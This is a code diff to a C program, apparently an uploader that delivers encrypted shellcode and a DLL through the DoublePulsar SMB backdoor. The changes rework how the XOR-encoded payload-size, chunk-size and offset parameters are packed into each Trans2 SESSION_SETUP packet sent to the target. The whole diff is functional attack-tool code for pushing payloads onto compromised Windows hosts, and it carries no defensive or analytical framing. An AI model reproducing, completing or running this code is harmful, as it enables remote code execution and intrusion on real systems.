@@ -737,14 +737,19 @@ int main(int argc, char* argv[])
 	//Copy the encrypted shellcode & DLL in 4096 byte chunks
 	//reads the response from the SMB response packet to determine if status is good or bad
 	int ctx;
-	int encrypted_buffer_len = sizeof(encrypted);
+	int encrypted_buffer_len = sizeof(encrypted)/sizeof(encrypted[0]);
 	int bytesLeft = encrypted_buffer_len;
 	printf("Uploading file...%d bytes to send\n", encrypted_buffer_len);
 	int numberofpackets = encrypted_buffer_len / 4096;
 	int iterations = encrypted_buffer_len % 4096;
 	printf("will send %d packets of data\n ", numberofpackets);
 	printf("%d as a remainder\n", iterations);
+	char Parametersbuffer[12];
 	
+	//PayloadSize is NOT correct; needs to be updated to actual value
+	unsigned int payload_size = 0x507308 ^ XorKey; //UPDATE PAYLOAD SIZE 
+	unsigned int chunk_size = 4096 ^ XorKey;
+	unsigned int o_offset = 0 ^ XorKey;
 	for (ctx = 0; ctx < encrypted_buffer_len;)
 	{
 		if (bytesLeft < 4096)
@@ -781,13 +786,19 @@ int main(int argc, char* argv[])
 			smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters
 			memcpy(big_packet+3, &smblen, 1);
 			
-			ChunkSize = bytesLeft ^ XorKey;
-			xor_payload(XorKey, SESSION_SETUP_PARAMETERS, 12);
+			//update ChunkSize to what's left
+			chunk_size = bytesLeft ^ XorKey;
+			//update Offset value to current offset value
+			o_offset = ctx ^ XorKey;
+			//copy separate parameter values to the Parametersbuffer value
+			memcpy(Parametersbuffer, (char*)&payload_size, 4);
+			memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
+			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
 			
-			//FIX HERE but copy the encrypted SESSION_SETUP parameters here before copying the last encrypted portion of the payload
-			memcpy(big_packet + 70, SESSION_SETUP_PARAMETERS, 12);
+			//copy the encrypted SESSION_SETUP parameters here before copying the last encrypted portion of the payload
+			memcpy(big_packet + 70, Parametersbuffer, 12);
 			
-			printf("Bytes left is less than 4096!...This will be the last & smaller packet!\n");
+			//copy bytes left in the encrypted buffer
 			memcpy(big_packet + 70 + 12, (unsigned char*)encrypted + ctx, bytesLeft);
 
 			send(sock, (char*)big_packet, smblen, 0);
@@ -800,7 +811,6 @@ int main(int argc, char* argv[])
 			}
 			goto multiplexcheck;
 		}
-		
 		
 		//copy the trans2 request to big_packet
 		memcpy(big_packet, trans2_request, sizeof(trans2_request));
@@ -827,13 +837,15 @@ int main(int argc, char* argv[])
 		//big_packet[51] = '\x1a';
 		//big_packet[52] = '\x00';
 		
-		OffsetOfChunkInPayload = ctx ^ XorKey;
+		//update Offset value
+		o_offset = ctx ^ XorKey;
+		//copy separate parameter values to the Parametersbuffer value
+		memcpy(Parametersbuffer, (char*)&payload_size, 4);
+		memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
+		memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
 		
-		//XOR the SESSION_SETUP parameters
-		xor_payload(XorKey, SESSION_SETUP_PARAMETERS, 12);
-		
-		//copy the SESSION_SETUP parameters
-		memcpy(big_packet +  70, (char*)SESSION_SETUP_PARAMETERS, 12);
+		//copy the parameters value to packet
+		memcpy(big_packet + 70, Parametersbuffer, 12);
 		
 		//copy 4096 bytes at a time from the XOR encrypted buffer
 		memcpy(big_packet +  70 + 12, (char*)encrypted+ctx, 4096);
